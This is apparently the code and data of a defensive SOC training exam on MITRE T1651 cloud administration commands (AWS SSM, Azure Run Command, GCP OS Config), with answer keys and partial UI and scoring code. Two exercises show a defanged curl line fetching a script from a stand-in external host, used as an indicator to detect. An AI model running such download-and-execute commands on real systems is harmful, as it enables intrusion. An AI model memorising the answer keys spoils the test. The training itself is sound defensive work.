var META={"topicId":"t1651","mitreId":"T1651","name":"Cloud Administration Command","mitreName":"Cloud Administration Command","objectType":"technique","title":"T1651 Cloud Administration Command — MEDIUM","difficulty":"medium","severity":"medium","severityLabel":"MEDIUM","batch":2,"questionCount":15,"estimatedMinutes":20,"passMark":70,"protocol":"cpa-staged-v1"};
var INTRO={"learnHtml":"<p><b>Exam scope:</b> this exam teaches <b>T1651 — Cloud Administration Command</b>, a <b>technique</b> of the MITRE ATT&amp;CK framework. <p><b>Welcome back to the Northwind Traders cloud SOC.<\/b> You now know that T1651 — Cloud Administration Command runs scripts inside VMs through platform agents, with no SSH, RDP, or guest password. This MEDIUM exam adds the <b>second step<\/b>: after you identify the service or log line, you must <b>decide<\/b> what it means.<\/p><p>You will work with the real log sources: <b>CloudTrail<\/b> <span class=\"mono\">SendCommand<\/span> events on AWS, <b>AzureActivity<\/b> records of <span class=\"mono\">runCommand<\/span> operations, and Google Cloud <b>OS Config<\/b>. You will read the CLI paths attackers and admins share — <span class=\"mono\">aws ssm send-command<\/span>, <span class=\"mono\">aws ssm start-session<\/span>, <span class=\"mono\">az vm run-command invoke<\/span> — and the <b>Runbooks<\/b> that automation accounts use to touch many VMs at once.<\/p><p>Every exercise makes you connect two ideas: <b>what happened in the control plane<\/b> and <b>what it means<\/b> — inside a maintenance window or outside it, routine or worth escalating. You will also meet mitigation <b>M1026 Privileged Account Management<\/b>: fewer accounts with remote-execution rights, MFA, and just-in-time elevation.<\/p>","themes":[{"name":"Admin command services and agents","concepts":["AWS SSM send-command","SSM StartSession","az vm run-command invoke","GCP OS Config","Runbooks (Automation accounts)"]},{"name":"Telemetry and correlation","concepts":["CloudTrail SendCommand event","Azure RunCommand operations","control-plane to guest correlation","maintenance windows"]},{"name":"Impact and response","concepts":["M1026 Privileged Account Management"]}]};
var EXERCISES=[{"id":"EX-01","type":"qcm-single","summary":"Which CloudTrail eventName records an SSM Run Command?","concepts":["CloudTrail SendCommand event"],"scenario":"<p>You open the AWS CloudTrail console after an alert. Your lead asks: \"Find me the events that show someone pushing a script to our instances through Systems Manager.\"<\/p>","question":"<p>Which <b>eventName<\/b> do you filter for?<\/p>","options":["RunInstances","SendCommand","StartSession","PutParameter"],"correct":1,"hint":"The API call that pushes a script to instances is named after what it does — it sends a command.","explanation":"<p><b>SendCommand<\/b> is the Systems Manager API (and CloudTrail event) that pushes a script to managed instances. RunInstances creates new instances, StartSession opens interactive SSM sessions, and PutParameter stores values in Parameter Store — none of those is a Run Command.<\/p>","study":"CloudTrail: filter eventName=SendCommand and review userIdentity and targets."},{"id":"EX-02","type":"line-select","summary":"Find the Run Command operation in AzureActivity.","concepts":["Azure RunCommand operations"],"scenario":"<p>Here is an AzureActivity digest from the Northwind tenant overnight. One operation is a script being pushed into a VM.<\/p>","question":"<p>Click the <b>one<\/b> line that shows a Run Command being pushed to a virtual machine.<\/p>","logLines":["2025-04-11T01:05:12Z  op=Microsoft.Compute/virtualMachines/write  caller=svc-image@northwind[.]example","2025-04-11T02:40:58Z  op=Microsoft.Compute/virtualMachines/runCommand/action  caller=m.reyes@northwind[.]example  vm=VM-FIN-01  result=Succeeded","2025-04-11T02:41:10Z  op=Microsoft.Network/networkSecurityGroups/write  caller=admin.ola@northwind[.]example","2025-04-11T02:50:00Z  op=Microsoft.Compute/virtualMachines/restart/action  caller=svc-maint@northwind[.]example","2025-04-11T03:15:44Z  op=Microsoft.Storage/storageAccounts/listKeys/action  caller=svc-report@northwind[.]example","2025-04-11T03:30:02Z  op=Microsoft.Compute/virtualMachines/deallocate/action  caller=svc-maint@northwind[.]example"],"badLines":[1],"artifactNote":"AzureActivity digest, 6 operations","hint":"Look for the operation path that ends in runCommand/action.","explanation":"<p>Line 2 records the <b>Run Command operation<\/b> (<span class=\"mono\">Microsoft.Compute/virtualMachines/runCommand/action<\/span>) called by <span class=\"mono\">m.reyes@northwind[.]example<\/span> against VM-FIN-01 — Azure running a script inside the VM through the VM agent. The other lines are image writes, firewall edits, restarts, key listings, and deallocations.<\/p>","study":"AzureActivity Log: flag Microsoft.Compute/virtualMachines/runCommand/action and review the caller."},{"id":"EX-03","type":"fill-blank","summary":"Complete the az vm run-command invoke test line.","concepts":["az vm run-command invoke"],"scenario":"<p>Your purple-team runbook includes a safe test of the Azure Run Command path. One line lost its key words during a copy-paste.<\/p>","question":"<p>Complete the Azure CLI line: az vm run-command <input1> --resource-group RG-PROD --vm-name VM-APP-02 --command-id <input2> --scripts 'whoami'<\/p>","template":"Complete the Azure CLI line: az vm run-command <input1> --resource-group RG-PROD --vm-name VM-APP-02 --command-id <input2> --scripts 'whoami'","blanks":[{"answer":"invoke","alts":["invocation"],"placeholder":"action word","width":9},{"answer":"RunShellScript","alts":["runshellscript"],"placeholder":"built-in document","width":16}],"hint":"First blank: what you do with run-command. Second blank: the built-in shell-script document.","explanation":"<p>The full path is <span class=\"mono\">az vm run-command invoke<\/span> with <span class=\"mono\">--command-id RunShellScript<\/span> — the built-in shell document. This is the exact command line both admins and intruders use, so your runbook should know it by heart.<\/p>","study":"az vm run-command reference: invoke, --command-id, --scripts, RunPowerShellScript."},{"id":"EX-04","type":"qcm-single","summary":"Which GCP service runs commands inside VM instances?","concepts":["GCP OS Config"],"scenario":"<p>A teammate covering the Google Cloud account asks: \"If an attacker had admin rights there, which service would let them run a script inside our VM instances without SSH?\"<\/p>","question":"<p>Which service are they describing?<\/p>","options":["BigQuery","Cloud DNS","OS Config","Cloud Storage"],"correct":2,"hint":"Its name says where it works: the operating system of the guest.","explanation":"<p><b>OS Config<\/b> is Google Cloud's service for running commands and applying guest policies on VM instances through its in-guest agent — the GCP equivalent of SSM Run Command and Azure RunCommand. BigQuery is analytics, Cloud DNS resolves names, and Cloud Storage holds files.<\/p>","study":"Google Cloud OS Config: guest policies and OS patch jobs from the control plane."},{"id":"EX-05","type":"drag-drop","summary":"Sort access methods: guest-plane vs control-plane.","concepts":["AWS SSM send-command","az vm run-command invoke"],"scenario":"<p>You are preparing a slide that contrasts the two execution planes. Sort the four access methods.<\/p>","question":"<p>Place each access method into the right bucket.<\/p>","bank":["SSH into a VM with a stolen key","RDP into a VM over the VPN","Systems Manager Run Command on an EC2 fleet","az vm run-command invoke on VM-APP-02"],"slots":[{"label":"Needs a network path plus guest credentials","accept":[0,1]},{"label":"Needs control-plane rights; the agent runs it","accept":[2,3]}],"hint":"Two methods log in to the guest; two ask the cloud service to do it.","explanation":"<p>SSH and RDP are <b>guest-plane<\/b>: they need a network path to the VM and credentials inside it. <b>Systems Manager Run Command<\/b> and <span class=\"mono\">az vm run-command invoke<\/span> are <b>control-plane<\/b>: only cloud admin rights are needed, and the platform agent executes the script.<\/p>","study":"For every VM, list which identities hold control-plane exec rights — that is your real exposure."},{"id":"EX-06","type":"qcm-single","summary":"Assess the late patch runbook against the change calendar.","concepts":["maintenance windows","Runbooks (Automation accounts)"],"scenario":"<p>CloudTrail shows <span class=\"mono\">SendCommand<\/span> by <span class=\"mono\">svc-patchbot<\/span> at 04:40 Sunday against the web fleet with the standard patch document. The change calendar says the patch window is Sunday 01:00–03:00. The automation ticket reads:<\/p><div class=\"ticket\"><span class=\"k\">Ticket<\/span> #CHG-1180 — nightly patch runbook, Automation account svc-patchbot. Status: <b>running late<\/b> — one stuck node delayed the fleet pass; retries allowed until 05:00.<\/div>","question":"<p>What is the correct assessment?<\/p>","options":["Benign — a documented runbook retry; note the delay in the ticket","Malicious — commands must never run outside the window","Attack — patch documents are never used by admins","Ignore — the calendar cannot excuse a late run"],"correct":0,"hint":"Check the ticket and the calendar together before you judge the timestamp.","explanation":"<p>The <b>Runbook<\/b> is documented, the identity is the known automation account, and the ticket explicitly allows retries until 05:00 — so the 04:40 run is a <b>benign late retry<\/b>, though the delay belongs in your notes. 'Never outside the window' is too rigid; real fleets run late. Attackers do abuse patch documents, but the paper trail here matches.<\/p>","study":"Keep maintenance windows and automation tickets next to your CloudTrail queries."},{"id":"EX-07","type":"fill-blank","summary":"Name the SSM call that opens an interactive shell.","concepts":["SSM StartSession"],"scenario":"<p>Your responder runbook describes the interactive variant of SSM access — not a one-shot script, but a live shell.<\/p>","question":"<p>Fill the blank: the CLI call aws ssm <input1> --target i-04a1b2c3 opens an interactive shell on the instance through Systems Manager — no SSH key required.<\/p>","template":"Fill the blank: the CLI call aws ssm <input1> --target i-04a1b2c3 opens an interactive shell on the instance through Systems Manager — no SSH key required.","blanks":[{"answer":"start-session","alts":["start session","startsession"],"placeholder":"action","width":14}],"hint":"It starts something, and the thing it starts is a session.","explanation":"<p><span class=\"mono\">aws ssm start-session<\/span> opens an interactive shell through the agent — the sibling of <b>send-command<\/b>. Attackers who already hold cloud credentials use it instead of SSH, so SSM session logs matter as much as SendCommand logs.<\/p>","study":"Review SSM Session Manager logging: where sessions are recorded in your account."},{"id":"EX-08","type":"ordering","summary":"Order the analyst triage steps after a SendCommand hit.","concepts":["control-plane to guest correlation"],"scenario":"<p>A <span class=\"mono\">SendCommand<\/span> alert lands in the queue. Put the correct triage order into the playbook.<\/p>","question":"<p>Order the steps from first to last.<\/p>","items":["Open the CloudTrail SendCommand record","Note the caller identity, role, and target instance","Pull guest process-creation logs for the same minute","Confirm the agent ran the same command inside the guest"],"hint":"You need the control-plane facts before the guest can confirm anything.","explanation":"<p>Triage runs control-plane first: read the <b>SendCommand record<\/b>, note <b>who and what target<\/b>, then pull <b>guest logs for that minute<\/b>, and finally <b>confirm<\/b> the agent executed the same command. This <b>control-plane to guest correlation<\/b> turns one cloud event into verified execution.<\/p>","study":"Practise joining CloudTrail times with in-guest process logs on one incident."}];

EXERCISES.push({"id":"EX-09","type":"matching","summary":"Match each log source to its cloud platform.","concepts":["CloudTrail SendCommand event","Azure RunCommand operations","GCP OS Config"],"scenario":"<p>New joiners keep mixing the log sources. Build the reference card.<\/p>","question":"<p>Click an item on the left, then its match on the right.<\/p>","pairs":[{"left":"CloudTrail SendCommand","right":"AWS record of a script pushed through Systems Manager"},{"left":"AzureActivity runCommand/action","right":"Azure record of a script run inside a VM"},{"left":"OS Config audit logs","right":"Google Cloud record of commands run on instances"}],"hint":"One log per cloud: AWS, Azure, then Google Cloud.","explanation":"<p><b>CloudTrail SendCommand<\/b> belongs to AWS, <b>AzureActivity runCommand/action<\/b> to Azure, and <b>OS Config audit logs<\/b> to Google Cloud. These three control-plane logs are where T1651 hunting starts on each platform.<\/p>","study":"Bookmark the three log queries for your multi-cloud estate."},
{"id":"EX-10","type":"qcm-multi","summary":"Select the two real M1026 risk reductions.","concepts":["M1026 Privileged Account Management"],"scenario":"<p>Your team is rewriting the cloud admin policy after a tabletop. Mitigation M1026 — Privileged Account Management — is on the whiteboard.<\/p>","question":"<p>Select the <b>two<\/b> actions that actually reduce T1651 risk, per M1026.<\/p>","options":["Limit how many cloud accounts can run remote commands on VMs","Require MFA and just-in-time elevation for admin roles","Uninstall the VM agent on every machine","Publish the admin account names on the intranet"],"correct":[0,1],"hint":"M1026 is about who holds privileged accounts and how they use them.","explanation":"<p>M1026 says: <b>limit<\/b> the accounts with remote-execution permission, keep them out of daily use, and protect them with <b>MFA and just-in-time elevation<\/b>. Uninstalling agents everywhere breaks normal operations and is not the mitigation, and publishing admin names only helps attackers.<\/p>","study":"ATT&CK mitigation M1026: privileged account management for cloud admin roles."},
{"id":"EX-11","type":"qcm-single","summary":"RED view: why is Run Command the attractive next step?","concepts":["Azure RunCommand operations"],"scenario":"<p>Purple-team day. This AzureActivity record is on your screen:<\/p><pre class=\"art mono\">time      2025-04-11T02:40:58Z\ncaller    m.reyes@northwind[.]example\noperation Microsoft.Compute/virtualMachines/runCommand/action\nresource  VM-FIN-01   status Succeeded<\/pre><p>You are role-playing the intruder. Your spear-phish just harvested the credentials of a user holding Virtual Machine Contributor rights on VM-FIN-01.<\/p>","question":"<p>Which next step best fits the intruder's goal of running code in the guest <b>without any guest login<\/b>?<\/p>","options":["RDP into VM-FIN-01 with the same password","Ask the helpdesk to reset the VM's local admin password","Push a script with Run Command through the VM agent","Reboot VM-FIN-01 from the portal and hope for a shell"],"correct":2,"hint":"The intruder wants execution with no login prompt, no port, and no new artefacts on the guest.","explanation":"<p>Run Command is the intruder's natural move: the same control-plane rights they already have make the <b>VM agent<\/b> execute a script — no RDP, no helpdesk, no reboot needed. The red view of the AzureActivity record is exactly what you will defend in the next exercise.<\/p>","study":"Think like the adversary: with VM Contributor rights, what would you run first?"},
{"id":"EX-12","type":"fill-blank","summary":"BLUE view: which field names who ran the operation?","concepts":["Azure RunCommand operations"],"scenario":"<p>Same artefact, now on the defender side. The SOC lead points at the AzureActivity record from the last exercise and asks: \"Before anything else — which field tells us <b>who<\/b> pushed that Run Command?\"<\/p>","question":"<p>Fill the blank: the <input1> field of the AzureActivity record names the identity that ran the operation.<\/p>","template":"Fill the blank: the <input1> field of the AzureActivity record names the identity that ran the operation.","blanks":[{"answer":"caller","alts":["the caller","caller field"],"placeholder":"field name","width":9}],"hint":"AzureActivity names the person or service that made the call.","explanation":"<p>The <b>caller<\/b> field is the identity behind the operation — the first thing a defender reads on any <span class=\"mono\">runCommand/action<\/span> record. Same artefact as the red view, opposite question: that is dual-perspective triage.<\/p>","study":"In every cloud log you use, learn which field carries the acting identity."},
{"id":"EX-13","type":"multi-step","summary":"Triage a SendCommand from a known automation identity.","concepts":["control-plane to guest correlation","CloudTrail SendCommand event"],"scenario":"<p>Saturday 04:12. CloudTrail shows a <span class=\"mono\">SendCommand<\/span> by <span class=\"mono\">svc-patchbot<\/span> — normally your fleet patch identity — but the target is a single database instance it has never touched, and the script runs <span class=\"mono\">curl hxxp[:]//files[.]upd-cdn[.]example/s[.]sh<\/span>.<\/p>","steps":[{"prompt":"What is your first move?","options":["Close the alert — svc-patchbot is a known automation identity","Check whether this target and script fit svc-patchbot's normal pattern","Reboot the database instance to break the script"],"correct":1,"outcome":"Right — the identity is known, so the real question is whether the behaviour fits it. A database target and an external fetch do not look like patching."},{"prompt":"The baseline shows svc-patchbot only runs patch documents on the web fleet. What next?","options":["Correlate with guest logs: did the agent really run that script at 04:12?","Delete the CloudTrail record to avoid confusion","Email the CTO that the database is compromised"],"correct":0,"outcome":"Correct — control-plane to guest correlation confirms or kills the hypothesis before you escalate. The guest logs for 04:12 decide it."}],"artifactNote":"CloudTrail SendCommand, automation identity, odd target","hint":"Known identity does not mean known behaviour; let the guest logs confirm before anything loud.","explanation":"<p>Two connected ideas: <b>identify<\/b> the identity and its baseline, then <b>decide<\/b> by correlating the control-plane event with in-guest execution. Only after guest logs confirm does this become an incident worth escalating.<\/p>","study":"Map every automation identity to its normal targets and documents.","question":"<p>Work through the branching steps below and choose the best action at each one.<\/p>"},
{"id":"EX-14","type":"line-select","summary":"Find the control-plane-driven execution in the guest log.","concepts":["control-plane to guest correlation"],"scenario":"<p>Guest-side log from VM-FIN-01 (Linux), around 02:41 — the minute of the runCommand record from earlier. One pair of lines proves the control plane reached the guest.<\/p>","question":"<p>Click the <b>two<\/b> lines that together show a control-plane command executing inside the guest.<\/p>","logLines":["01:40:11  systemd: apt-daily-upgrade started","01:40:40  sshd: connection closed by 10[.]0[.]0[.]9 port 22","02:41:03  runcommand-ext: script started (RunCommandHost), caller m.reyes@northwind[.]example","02:41:03  sh -c whoami; curl -s hxxp[:]//files[.]upd-cdn[.]example/s[.]sh -o /tmp/s","02:41:29  systemd: apt-daily-upgrade finished","02:42:10  cron: logrotate success"],"badLines":[2,3],"artifactNote":"Guest log from VM-FIN-01, 6 lines","hint":"One line names the Run Command mechanism and caller; the next shows the script it ran.","explanation":"<p>Line 3 shows the <b>Run Command extension<\/b> starting a script with the caller named — the control-plane side. Line 4 is the actual script it executed, fetching from an external domain. Together they are the guest half of the correlation. The upgrade job, SSH close, and logrotate are routine.<\/p>","study":"Learn where the Run Command extension logs on your Linux and Windows guests."},
{"id":"EX-15","type":"terminal","summary":"Type the SSM send-command for a safe check.","concepts":["AWS SSM send-command"],"scenario":"<p>You are on the IR jump host with the AWS CLI configured for the affected account. Your lead names the tool: \"Use Systems Manager to run one safe check — the <span class=\"mono\">id<\/span> command — on instance <span class=\"mono\">i-0d3f7a2b9c1e4f6a<\/span>, with the shell-script document.\" No syntax panel this time.<\/p>","question":"<p>Type the full command.<\/p>","shellPrompt":"analyst@ir-jump:~$","expected":"aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-0d3f7a2b9c1e4f6a --parameters commands=id","elements":[{"any":["send-command"],"label":"the send-command action"},{"any":["--document-name","aws-runshellscript"],"label":"the --document-name parameter with the shell-script document"}],"hint":"Start with aws ssm, then the action, then --document-name with the shell document.","explanation":"<p><span class=\"mono\">aws ssm send-command --document-name AWS-RunShellScript --instance-ids … --parameters commands=id<\/span> pushes the script through the control plane; the SSM Agent runs it and the output comes back. Responders use the same path attackers do — which is why you should know it by hand.<\/p>","study":"aws ssm send-command parameters: --targets, --parameters, --comment, --output-s3-bucket-name."});

      if (ex.type === 'ordering') m.ord = shuffle(ex.items.map(function (b, idx) { return idx; }));
      if (ex.type === 'matching') m.right = shuffle(ex.pairs.map(function (b, idx) { return idx; }));

  }

  /* ---------------- timer ---------------- */
  function setTimerState(state) {
    S.timerState = state;
    var ic = $('tbTimer').querySelector('.ic'), word = $('tbTimerWord');
    if (state === 'RUNNING') { ic.textContent = '▶'; word.textContent = 'RUNNING'; $('tbTimer').style.color = ''; }
    else if (state === 'PAUSED_MANUAL') { ic.textContent = '⏸'; word.textContent = 'PAUSED — manual (press Resume)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'PAUSED_AUTO_CHECK') { ic.textContent = '⏸'; word.textContent = 'PAUSED — reviewing feedback (resumes on Next)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'ENDED') { ic.textContent = '⏹'; word.textContent = 'ENDED'; $('tbTimer').style.color = 'var(--state-incorrect)'; }
    else { ic.textContent = '⏱'; word.textContent = 'READY'; }
  }
  function tick() {
    if (S.timerState === 'PAUSED_MANUAL') { S.manualPauseMs += 250; }
    if (S.timerState === 'PAUSED_AUTO_CHECK') { S.autoPauseMs += 250; }
    if (S.timerState === 'RUNNING') {
      S.remaining -= 1;
      if (S.remaining <= 0) { S.remaining = 0; setTimerState('ENDED'); finishExam(true); }
    }
    $('tbTimerVal').textContent = fmtTime(S.remaining);
  }
  function startTimer() { S.remaining = (META.estimatedMinutes || 15) * 60; setTimerState('RUNNING'); setInterval(tick, 1000); }

  /* ---------------- live score ---------------- */
  function creditSum() { var s = 0, n = 0; for (var i = 0; i < S.answers.length; i++) { if (S.answers[i].status === 'checked') { s += S.answers[i].credit; n++; } } return { sum: s, n: n }; }
  function updateScoreBar() {
    var r = creditSum();
    $('tbScoreSum').textContent = r.sum.toFixed(1) + ' / ' + r.n;
    $('tbScorePct').textContent = (r.n > 0 ? Math.round((r.sum / r.n) * 100) : 0) + '%';
  }

  function widgetFor(ex, box, wstate) {

    } else if (ex.type === 'ordering') {

      function drawOrd() {
        ol.innerHTML = '';
        wstate.order.forEach(function (bi, pos) {
          var li = el('li');
          li.appendChild(el('span', 'ord-idx', String(pos + 1)));

          var up = el('button', null, '↑'); up.type = 'button'; up.setAttribute('aria-label', 'Move item ' + (pos + 1) + ' up');

      drawOrd(); box.appendChild(ol);
    } else if (ex.type === 'matching') {

        });
        S.shuffles[S.current].right.forEach(function (ri, pos) {

          var b = el('button', 'mchip', (usedBy >= 0 ? '<span class="pairno">' + (usedBy + 1) + '</span>' : '') + esc(ex.pairs[ri].right));

            if (usedBy >= 0) { delete wstate.assign[usedBy]; drawMatch(); return; }
            if (wstate.activeLeft === null) return;
            wstate.assign[wstate.activeLeft] = ri; wstate.activeLeft = null; drawMatch();
          });
          rcol.appendChild(b);
        });
      }
      drawMatch();
      mw.appendChild(lcol); mw.appendChild(rcol); box.appendChild(mw);
      var un = el('button', 'btn btn-ghost matchundo', '↺ Undo all pairs');
      un.type = 'button';
      un.addEventListener('click', function () { if (S.answers[S.current].status === 'checked') return; wstate.assign = {}; wstate.activeLeft = null; drawMatch(); });
      box.appendChild(un);
    } else if (ex.type === 'terminal') {
      wstate.cmd = wstate.cmd || '';
      var term = el('div', 'term');
      term.appendChild(el('div', 't-bar',
        '<span class="t-dot d-r"></span><span class="t-dot d-a"></span><span class="t-dot d-g"></span><span class="t-title">' + esc(ex.shellPrompt || 'shell') + ' — type the command, then press Enter or Check</span>'));
      var body = el('div', 't-body');
      var hist = el('div', 't-hist'); hist.textContent = wstate.cmd ? wstate.cmd : '';
      var inrow = el('div', 't-in');
      var pr = el('span', 'pr', esc(ex.shellPrompt || '$'));
      var inp = document.createElement('input');
      inp.type = 'text'; inp.value = wstate.cmd; inp.setAttribute('aria-label', 'Terminal command input'); inp.autocomplete = 'off'; inp.spellcheck = false;

      inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { ev.preventDefault(); doCheck(); } });
      inrow.appendChild(pr); inrow.appendChild(inp);
      body.appendChild(hist); body.appendChild(inrow); term.appendChild(body);
      box.appendChild(term);
      if (ex.syntaxPanel) box.appendChild(el('div', 'syntax', ex.syntaxPanel));
      setTimeout(function () { try { inp.focus(); } catch (e) { } }, 60);
    } else if (ex.type === 'line-select') {
      wstate.sel = wstate.sel || [];

      var bar = el('div', 'lv-bar', '<span class="lv-tag">FILTER</span>');
      var finp = document.createElement('input');

  /* ---------------- scoring ---------------- */
  function scoreExercise(ex, wstate) {
    var items = [], N = 0, H = 0, W = 0, canon = null;
    function item(state, label) { items.push({ state: state, label: label }); }
    if (ex.type === 'qcm-single') {
      N = 1;
      var sel = wstate.sel && wstate.sel[0];
      if (sel === undefined) { item('mi', 'No option selected'); }
      else if (sel === ex.correct) { H = 1; item('ok', '✓ Correct — ' + strip(ex.options[ex.correct])); }
      else { W = 1; item('no', '✗ You chose: ' + strip(ex.options[sel])); }
      canon = ex.options[ex.correct];
    } else if (ex.type === 'qcm-multi') {
      N = ex.correct.length;
      var selset = wstate.sel || [];
      ex.correct.forEach(function (ci) {
        if (selset.indexOf(ci) >= 0) { H++; item('ok', '✓ Correct: ' + strip(ex.options[ci])); }
        else { item('mi', '○ Missed: ' + strip(ex.options[ci])); }
      });
      selset.forEach(function (si) { if (ex.correct.indexOf(si) < 0) { W++; item('no', '✗ Wrong: ' + strip(ex.options[si])); } });
      canon = ex.correct.map(function (ci) { return strip(ex.options[ci]); }).join(' · ');
    } else if (ex.type === 'fill-blank') {
      N = ex.blanks.length;
      ex.blanks.forEach(function (bl, bi) {
        var v = norm(wstate.vals && wstate.vals[bi]);
        var accept = [norm(bl.answer)].concat((bl.alts || []).map(norm));
        if (!v) { item('mi', '○ Missed blank ' + (bi + 1) + ' — expected: ' + esc(bl.answer)); }
        else if (accept.indexOf(v) >= 0) { H++; item('ok', '✓ Blank ' + (bi + 1) + ': ' + esc(bl.answer)); }
        else { W++; item('no', '✗ Blank ' + (bi + 1) + ' — you typed "' + esc(v) + '", expected: ' + esc(bl.answer)); }
      });
      canon = ex.blanks.map(function (bl) { return bl.answer; }).join(' | ');
    } else if (ex.type === 'drag-drop') {
      N = ex.bank.length;
      Object.keys(wstate.place || {}).forEach(function (k) {
        var bi = parseInt(k, 10), si = wstate.place[k];
        if (ex.slots[si] && ex.slots[si].accept.indexOf(bi) >= 0) { H++; item('ok', '✓ "' + strip(ex.bank[bi]) + '" → ' + esc(ex.slots[si].label)); }
        else { W++; item('no', '✗ "' + strip(ex.bank[bi]) + '" does not belong in ' + esc(ex.slots[si] ? ex.slots[si].label : '?')); }
      });
      ex.bank.forEach(function (t, bi) { if (wstate.place[bi] === undefined) item('mi', '○ Missed: "' + strip(t) + '" → ' + esc(slotLabelFor(ex, bi))); });
      canon = ex.slots.map(function (sl) { return sl.label + ': ' + sl.accept.map(function (bi) { return strip(ex.bank[bi]); }).join(', '); }).join(' | ');
    } else if (ex.type === 'ordering') {
      N = ex.items.length;
      var order = wstate.order || [];
      order.forEach(function (bi, pos) {
        if (bi === pos) { H++; item('ok', '✓ Position ' + (pos + 1) + ': ' + strip(ex.items[pos])); }
        else { W++; item('no', '✗ Position ' + (pos + 1) + ' — you put "' + strip(ex.items[bi]) + '", expected "' + strip(ex.items[pos]) + '"'); }
      });
      canon = ex.items.map(function (t, i) { return (i + 1) + '. ' + strip(t); }).join(' ');
    } else if (ex.type === 'matching') {
      N = ex.pairs.length;
      ex.pairs.forEach(function (p, li) {
        var a = (wstate.assign || {})[li];
        if (a === undefined) item('mi', '○ Missed: "' + strip(p.left) + '" → ' + esc(p.right));
        else if (a === li) { H++; item('ok', '✓ "' + strip(p.left) + '" → ' + esc(p.right)); }
        else { W++; item('no', '✗ "' + strip(p.left) + '" you matched to "' + strip(ex.pairs[a].right) + '", expected "' + esc(p.right) + '"'); }
      });
      canon = ex.pairs.map(function (p) { return strip(p.left) + ' = ' + strip(p.right); }).join(' | ');
    } else if (ex.type === 'terminal') {
      N = ex.elements.length;
      var cmd = norm(wstate.cmd || '');
      ex.elements.forEach(function (el2) {
        var hit = (el2.any || []).some(function (a) { return cmd.indexOf(String(a).toLowerCase()) >= 0; });
        if (hit) { H++; item('ok', '✓ ' + esc(el2.label)); }
        else { item('mi', '○ Missing: ' + esc(el2.label)); }
      });
      if (!cmd) item('mi', '○ Nothing typed — expected: ' + esc(ex.expected));
      canon = ex.expected;
    } else if (ex.type === 'line-select') {
      N = ex.badLines.length;
      var sel2 = wstate.sel || [];
      ex.badLines.forEach(function (li) {
        if (sel2.indexOf(li) >= 0) { H++; item('ok', '✓ Line ' + (li + 1) + ' is indeed the one to flag'); }
        else { item('mi', '○ Missed line ' + (li + 1) + ': ' + esc(shorten(ex.logLines[li], 90))); }
      });
      sel2.forEach(function (li) {
        if (ex.badLines.indexOf(li) < 0) { W++; item('no', '✗ Line ' + (li + 1) + ' is benign: ' + esc(shorten(ex.logLines[li], 80))); }
      });
      canon = ex.badLines.map(function (li) { return 'line ' + (li + 1); }).join(', ');
    } else if (ex.type === 'multi-step') {
      N = ex.steps.length;
      ex.steps.forEach(function (st, si) {
        var p = (wstate.picks || {})[si];
        if (p === undefined) item('mi', '○ Missed step ' + (si + 1) + ' — expected: ' + strip(st.options[st.correct]));
        else if (p === st.correct) { H++; item('ok', '✓ Step ' + (si + 1) + ': ' + strip(st.options[st.correct])); }
        else { W++; item('no', '✗ Step ' + (si + 1) + ' — you chose "' + strip(st.options[p]) + '", expected "' + strip(st.options[st.correct]) + '"'); }
      });
      canon = ex.steps.map(function (st, si) { return (si + 1) + '. ' + strip(st.options[st.correct]); }).join(' ');
    }
    var credit = N > 0 ? Math.max(0, (H - W) / N) : 0;
    if (N === 1) credit = H === 1 ? 1 : 0; /* single-answer: binary */
    if (S.answers[S.current].hintUsed) credit = Math.max(0, credit - 0.10);
    credit = Math.round(credit * 100) / 100;
    return { credit: credit, items: items, N: N, H: H, W: W, canon: canon };
  }
  function strip(s) { return esc(String(s).replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim()); }
  function shorten(s, n) { s = String(s); return s.length > n ? s.slice(0, n - 1) + '…' : s; }
  function slotLabelFor(ex, bi) { var lbl = ''; ex.slots.forEach(function (sl) { if (sl.accept.indexOf(bi) >= 0) lbl = sl.label; }); return lbl; }

  /* ---------------- exercise screen ---------------- */
  function renderExercise(i) {
    var ex = EXERCISES[i];
    S.current = i;
    var a = S.answers[i];
    var area = $('exerciseArea'); area.innerHTML = '';
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    $('progressBar').style.width = Math.round(((i + 1) / EXERCISES.length) * 100) + '%';
    var tpEl = $('tbPart'); if (tpEl) { tpEl.textContent = 'Exercise ' + (i + 1) + ' of ' + EXERCISES.length; }

    var card = el('div', 'card');
    /* SCENARIO */
    var sc = el('div', 'block blk-scenario');
    var longSc = ex.scenario.length > 380;
    sc.innerHTML = '<div class="block-h"><span aria-hidden="true">📄</span> SCENARIO' + (longSc ? '<button type="button" class="sc-toggle" aria-expanded="true">⇅ collapse</button>' : '') + '</div>' +
      '<div class="block-b" id="scBody">' + ex.scenario + (ex.artifactNote ? '<div class="dd-hint">' + esc(ex.artifactNote) + '</div>' : '') + '</div>';
    card.appendChild(sc);
    if (longSc) {
      var tbtn = sc.querySelector('.sc-toggle'), body = sc.querySelector('#scBody');
      tbtn.addEventListener('click', function () {
        var open = tbtn.getAttribute('aria-expanded') === 'true';
        tbtn.setAttribute('aria-expanded', String(!open));
        tbtn.textContent = open ? '⇅ expand' : '⇅ collapse';
        body.classList.toggle('hidden', open);
      });
    }
    /* QUESTION */
    card.appendChild(el('div', 'block blk-question',
      '<div class="block-h"><span aria-hidden="true">❓</span> QUESTION</div><div class="block-b">' + ex.question + '</div>'));
    /* YOUR ANSWER */
    var answ = el('div', 'block blk-answer', '<div class="block-h"><span aria-hidden="true">✍</span> YOUR ANSWER</div>');
    var abody = el('div', 'block-b'); answ.appendChild(abody); card.appendChild(answ);

    var wstate = a.wstate;
    widgetFor(ex, abody, wstate);

    /* action row */
    var actions = el('div', 'actions');
    var checkBtn = el('button', 'btn btn-primary', '✓ Check');
    checkBtn.type = 'button'; checkBtn.id = 'checkBtn'; checkBtn.setAttribute('aria-label', 'Check your answer');
    checkBtn.addEventListener('click', doCheck);
    var nextBtn = el('button', 'btn btn-blue hidden', (i === EXERCISES.length - 1 || S.reviewMode) ? (S.reviewMode ? '⏭ Back to review' : '⏭ Final submit') : '⏭ Next');
    nextBtn.type = 'button'; nextBtn.id = 'nextBtn';
    nextBtn.addEventListener('click', goNext);
    var hintBtn = el('button', 'btn btn-amber', '💡 Hint (−10%)');
    hintBtn.type = 'button'; hintBtn.setAttribute('aria-label', 'Show hint, costs 10 percent of this exercise credit');
